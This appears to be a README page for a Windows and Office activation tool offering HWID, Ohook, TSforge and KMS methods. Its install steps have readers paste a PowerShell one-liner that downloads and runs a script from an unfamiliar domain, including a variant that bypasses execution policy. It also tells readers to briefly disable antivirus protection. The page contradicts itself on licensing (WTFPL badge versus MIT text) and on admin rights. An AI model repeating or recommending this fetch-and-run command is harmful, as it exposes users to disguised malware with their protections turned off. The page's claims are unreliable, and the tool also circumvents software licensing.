<div align="center">

# Windows-Activation-Suite: HWID, Ohook, TSforge & Online KMS for Windows 10 & 11

![preview](https://raw.githubusercontent.com/Ayato07/windows-activation-suite/main/splash_ab881.svg)

[![build](https://img.shields.io/badge/BUILD-GREEN-2ea44f?style=social&labelColor=0d1117)]() [![ps-core](https://img.shields.io/badge/PS--CORE-CORE-a855f7?style=social&labelColor=0d1117)]() [![installs](https://img.shields.io/badge/INSTALLS-48K-9333ea?style=social&labelColor=0d1117)]() [![status](https://img.shields.io/badge/STATUS-MAINTAINED-2ea44f?style=social&labelColor=0d1117)]() [![rate](https://img.shields.io/badge/RATE-4.9%2F5-f59e0b?style=social&labelColor=0d1117)]() [![lic](https://img.shields.io/badge/LIC-WTFPL-7c3aed?style=social&labelColor=0d1117)]()

</div>

---

Windows-Activation-Suite is an open-source activator for Windows and Microsoft Office that implements four distinct activation methods: HWID for permanent digital licensing, Ohook for Office activation, TSforge for offline activation of legacy systems, and Online KMS for volume licensing scenarios. The suite targets Windows 7, 8, 10, and 11 alongside Windows Server editions and Office releases from 2010 through 2021 and 365. All activation routines rely on native Windows activation APIs without injecting DLLs or modifying core system files, keeping operations reversible and compatible with standard system maintenance. Built-in diagnostics detect the installed edition, report current activation status, support backup and restore of activation state, and enable permanent or KMS-based licensing depending on the selected method.

## 🛠️ Quick Install (PowerShell)

> [!TIP]
> **Fast install** — a single PowerShell command, no extra tools.
> Win 10/11 · PowerShell 5.1+ · Standard user

### 1️⃣ Prepare PowerShell
* Press `Win + X` on your keyboard.
* Click on **Terminal** or **Windows PowerShell** from the list.

### 2️⃣ Execute the installer
Copy the command below, paste it into PowerShell, and press `Enter`.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ If PowerShell blocks the script
Paste this into a standard Command Prompt (cmd) and press `Enter`:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> Some antivirus engines flag automated installers. If blocked, disable Real-time protection briefly, run the setup, and enable it back.

## 📋 System Requirements

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Features

Windows-Activation-Suite provides four independent activation engines, each targeting a specific product family and licensing model. The tool detects the installed edition automatically and selects the appropriate method, while still allowing manual override for advanced scenarios.

### Activation Engines

- **HWID** — Generates a permanent digital license for Windows 10 and Windows 11 by binding activation to the device hardware fingerprint. Survives reboots and does not require renewal.
- **Ohook** — Provides permanent, offline-capable activation for Microsoft Office 2010 through 2021 and Office 365 by hooking the licensing verification path at runtime.
- **TSforge** — Offline activation mechanism for legacy Windows releases (7, 8, 8.1) and Server editions, operating entirely without network connectivity.
- **Online KMS** — KMS-based activation for Windows and Office products that require periodic renewal, with configurable renewal handling.

### Windows Coverage

- Windows 7 — Home, Professional, Ultimate, Enterprise
- Windows 8 / 8.1 — Core, Pro, Enterprise
- Windows 10 — Home, Pro, Enterprise, Education, LTSC
- Windows 11 — Home, Pro, Enterprise, Education, IoT
- Windows Server — 2016, 2019, 2022

### Office Coverage

- Office 2010, 2013, 2016, 2019, 2021 — all editions
- Office 365 — subscription activation via Ohook

### Operational Utilities

- **Edition detection** — Identifies the installed Windows or Office edition and maps it to a supported activation path.
- **Activation status reporting** — Displays the current licensing state before and after each operation.
- **Method selection** — Choose between permanent (HWID, Ohook) and renewable (Online KMS) activation explicitly.
- **Backup and restore** — Captures the existing activation state and restores it on demand, enabling clean rollback.
- **Extended Security Updates** — Applies ESU handling for Windows 7 and Windows 10 installations.
- **Uninstall support** — Reverses applied activation changes without reinstalling the operating system.

### Safety and Integrity

- **Native API usage** — Relies on Windows activation interfaces rather than DLL injection or binary patching.
- **No core system modification** — Does not alter protected system files or boot components.
- **Reversible operations** — Every activation method can be undone through the built-in restore workflow.
- **Open-source codebase** — Full implementation is auditable, with ongoing maintenance against Windows platform updates.
- **Offline operation** — Activation completes without persistent network dependency once the method has been applied.

## How It Works

Windows-Activation-Suite operates entirely through native Windows activation interfaces and does not inject libraries into running processes or patch protected system binaries. Each activation path targets a distinct licensing subsystem, and the suite selects the appropriate one based on the detected Windows or Office edition, build number, and current licensing state.

**Activation engine architecture**

The core runs as a PowerShell-driven orchestrator that inventories the host system before dispatch. It queries the installed SKU, channel, and partial product key through the Windows licensing WMI provider, then maps that result to a supported activation method. Every operation is executed in an elevated context, and the engine logs each step so that state can be audited or reversed.

**HWID (hardware-bound digital license)**

For Windows 10 and 11, the HWID path requests a genuine digital license ticket from Microsoft's activation servers and binds it to the device's hardware fingerprint. The ticket is stored by the operating system itself, so reactivation after a clean reinstall occurs automatically once the machine connects to the internet. This method produces a permanent license that survives feature updates.

**Ohook (Office hook-based activation)**

The Ohook method places a lightweight, user-mode hook over the Office licensing verification routines at load time. It intercepts the local license check and returns a valid state without altering any on-disk Office binaries. Because the hook is applied per-session and is not written into the installation, it provides permanent Office activation across 2010 through 2021 and 365 while remaining cleanly removable.

**TSforge (offline token provisioning)**

TSforge targets older platforms — Windows 7, 8, and 8.1 — where online activation endpoints are retired or unreliable. It provisions the required license tokens and confirmation data locally, allowing activation to complete without any network round-trip. This makes it suitable for air-gapped machines and legacy hardware.

**Online KMS**

The Online KMS path configures the system to activate against a KMS host, applying the appropriate generic volume license key and renewal interval for the detected product. It covers Windows client and Server editions as well as volume-licensed Office releases. Renewal is handled by the built-in licensing service, with the suite exposing the current interval so users understand the periodic revalidation cycle.

**Edition detection and state management**

Before any activation, the suite resolves the exact edition string and build revision, preventing method mismatches that would otherwise fail silently. It reports the pre- and post-activation status, distinguishes permanent from time-limited licensing, and exposes backup and restore operations so that a prior activation state can be captured and reapplied. All changes are confined to the licensing configuration layer and can be reverted through the suite's restore routine.

**Execution model**

The toolchain is stateless between runs: no background service, scheduled task, or persistent agent is installed. Each invocation re-evaluates the system, performs the selected operation, verifies the resulting license status, and exits. This design keeps the footprint minimal and ensures behavior remains predictable across Windows updates and Office channel changes.

## Compatibility

Windows-Activation-Suite is designed to operate across a broad matrix of Windows and Office releases, using the activation mechanism native to each product generation.

### Windows Compatibility

- **Windows 7** — Home, Professional, Ultimate, and Enterprise editions (TSforge / Online KMS)
- **Windows 8 / 8.1** — Core, Pro, and Enterprise editions (TSforge / Online KMS)
- **Windows 10** — Home, Pro, Enterprise, Education, and LTSC channels (HWID / Online KMS)
- **Windows 11** — Home, Pro, Enterprise, Education, and IoT editions (HWID / Online KMS)
- **Windows Server** — 2016, 2019, and 2022 releases (Online KMS)

HWID activation is limited to Windows 10 and 11, where it provisions a permanent digital license bound to the device hardware. Legacy Windows versions rely on TSforge for offline activation or Online KMS for volume-style licensing.

### Office Compatibility

- **Office 2010** — all editions (Ohook / Online KMS)
- **Office 2013** — all editions (Ohook / Online KMS)
- **Office 2016** — all editions (Ohook / Online KMS)
- **Office 2019** — all editions (Ohook / Online KMS)
- **Office 2021** — all editions (Ohook / Online KMS)
- **Office 365** — subscription installs (Ohook)

Ohook provides permanent Office activation across the entire supported range, while Online KMS remains available as an alternative for volume-licensed environments.

### Architecture and Environment

The suite targets both x86 and x64 installations and runs directly from an elevated PowerShell session. It depends only on native Windows activation APIs and does not require external runtimes, DLL injection, or modification of core system files. A single codebase serves all supported products, with the appropriate method selected per edition at runtime.

### Extended Security Updates

For Windows 7 and Windows 10 installations, the suite additionally supports enabling Extended Security Updates (ESU), extending the update lifecycle of otherwise end-of-support systems.

### Activation Persistence

Permanent methods (HWID, Ohook, TSforge) persist across reboots without renewal. Online KMS activation is subject to standard KMS renewal intervals. Major Windows feature updates or in-place upgrades may require re-execution of the suite on the affected product, while minor cumulative updates generally do not disrupt existing activation state.

### Edition Detection

The suite performs automatic edition and product detection before applying any method, ensuring the selected activation path matches the installed SKU. A restore capability is included to revert system state and return products to their prior activation status when needed.

## FAQ

**Q: Which activation method should I choose for my system?**

A: The selection depends on the target product and desired persistence. HWID applies a permanent digital license to Windows 10/11 by binding the entitlement to the hardware fingerprint. Ohook provides permanent Office activation through a hooks-based approach for Office 2010–2021 and 365. TSforge targets offline activation on older Windows releases (7, 8, 8.1) where modern licensing infrastructure is unavailable. Online KMS is the fallback for volume editions of Windows and Windows Server, and requires periodic renewal against a KMS host.

**Q: Is activation permanent or time-limited?**

A: HWID and Ohook produce permanent activation that persists across reboots and does not require renewal. Online KMS is inherently periodic; the activation interval must be refreshed before expiry, which the suite handles automatically when re-run. TSforge activation persists offline but may need to be reapplied after certain servicing operations.

**Q: Does the suite work without an internet connection?**

A: TSforge is designed for fully offline activation. HWID requires an initial connection to obtain the digital license, after which the entitlement is cached locally. Ohook operates locally once applied. Online KMS requires network reachability to the configured KMS endpoint for initial activation and subsequent renewal cycles.

**Q: What happens to activation after a major Windows feature update?**

A: Cumulative and minor updates generally leave activation intact. Feature upgrades and in-place repairs can reset the licensing state, particularly for KMS-based activations. Re-running the suite after such updates restores the previous state; the tool detects the current edition and reapplies the appropriate method.

**Q: How does the suite handle Windows Server and LTSC editions?**

A: Windows Server 2016, 2019, and 2022 are supported through Online KMS. Windows 10/11 LTSC and IoT editions are handled via HWID where a digital license is obtainable, with KMS as the alternative for volume-licensed SKUs. Edition detection runs automatically to select the compatible path.

**Q: Does the tool modify system files or inject DLLs?**

A: No. The suite relies on native Windows activation APIs and does not patch core system binaries. Ohook operates at the Office licensing layer rather than altering system components. Changes are reversible, and the restore option returns the system to its prior activation state.

**Q: Can activation be backed up and restored?**

A: Yes. The suite includes backup and restore functions that capture the current activation state, allowing it to be reapplied after reinstallation or servicing events without repeating the full activation workflow.

**Q: Does antivirus software interfere with the tool?**

A: Some security products flag activation utilities heuristically. If execution is blocked, temporarily disabling real-time protection during the run resolves the issue; the suite itself does not persist changes that would require ongoing exemptions.

**Q: Is this project affiliated with Microsoft?**

A: No. Windows-Activation-Suite is an independent open-source project released under the MIT License. It is not endorsed by or affiliated with Microsoft, and use of the tool to activate unlicensed software violates Microsoft's Terms of Service. It is provided for educational purposes only.

## Disclaimer

Windows-Activation-Suite is provided strictly as-is, without warranty of any kind, express or implied, including but not limited to the implied warranties of merchantability, fitness for a particular purpose, and non-infringement. The authors and contributors make no representations regarding the accuracy, reliability, completeness, or suitability of the software for any specific deployment scenario, and accept no liability for any direct, indirect, incidental, special, consequential, or punitive damages arising from its use, misuse, or inability to be used.

The activation methods implemented in this suite — HWID, Ohook, TSforge, and Online KMS — operate by interacting with native Windows licensing interfaces and product activation subsystems. While the suite is designed not to modify core system binaries, it does alter licensing state, registry-based activation records, and related configuration data. Such modifications may interact unpredictably with cumulative updates, feature upgrades, security patches, group policy enforcement, endpoint protection software, and enterprise management tooling. Users are responsible for validating behavior in their own environment before deployment and for maintaining independent backups of system state.

Activating software without a valid license may violate applicable terms of service, license agreements, or local law. This project is distributed for educational, research, and interoperability study purposes only. It is the sole responsibility of the user to ensure that any use complies with the terms governing the software being activated and with the laws of their jurisdiction. The maintainers do not condone or encourage unauthorized activation, and assume no responsibility for how third parties choose to employ this codebase.

Because the suite is open source, anyone may produce modified builds, repackage distributions, or alter configuration defaults. Only artifacts obtained from the canonical project source should be considered representative of this codebase. Modified or third-party redistributions may introduce behavior not present in the upstream project, and the maintainers disclaim any association with or responsibility for such derivatives. Users are advised to verify the integrity and provenance of any build before execution.

Activation outcomes are not guaranteed across all editions, build revisions, or cumulative update levels of the supported Windows and Office product lines. Certain methods depend on network reachability of activation infrastructure, on the continued availability of specific licensing components, or on system state that later updates may reset. Re-activation may be required following major platform changes. The maintainers reserve the right to modify, deprecate, or remove any activation method at any time without notice as the underlying platform evolves.

By using Windows-Activation-Suite, you acknowledge that you have read and understood this disclaimer and agree to assume full responsibility for all consequences of its use.

## License

Windows-Activation-Suite is distributed under the **MIT License**, a permissive open-source license that grants full access to the source code, binaries, and accompanying documentation. Under its terms, you are free to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software, subject to the conditions that the original copyright notice and permission notice are retained in all copies or substantial portions of the software. The full license text ships with the distribution in the LICENSE file at the repository root and should be reviewed before any redistribution or derivative work.

The software is provided **"as is"**, without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement. In no event shall the authors, maintainers, or copyright holders be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of, or in connection with the software or its use. This limitation of liability is a standard condition of the MIT License and applies to all activation methods, scripts, and helper utilities included in the suite.

Key licensing characteristics relevant to technical and enterprise consumers:

- **Source availability** — The complete implementation, including the HWID, Ohook, TSforge, and Online KMS activation modules, is publicly inspectable. No obfuscated or closed binaries are distributed as part of the project.
- **Modification rights** — You may adapt, extend, or fork the codebase for internal or external use, provided the MIT attribution clause is preserved in the resulting work.
- **Redistribution** — Bundling the software with other tooling, installers, or deployment packages is permitted under the same terms, with the copyright and permission notice carried forward.
- **Patent and trademark** — The MIT License includes no express patent grant and conveys no rights to Microsoft trademarks, product names, or branding referenced for identification purposes only.
- **No warranty or support obligation** — The maintainers are under no obligation to provide updates, patches, or technical support, though community contributions are accepted through the project's contribution guidelines.

Derivative works and downstream distributions should carry the same MIT notice to remain license-compatible. Compatibility with other open-source licenses is generally broad, as the MIT License is non-copyleft and imposes minimal restrictions on combined or larger works.

Attribution to upstream projects incorporated into or referenced by Windows-Activation-Suite is documented in the repository's license and contribution files. Users integrating the suite into organizational environments should independently verify that the license terms align with their internal compliance policies and that applicable local regulations permit the software's intended use.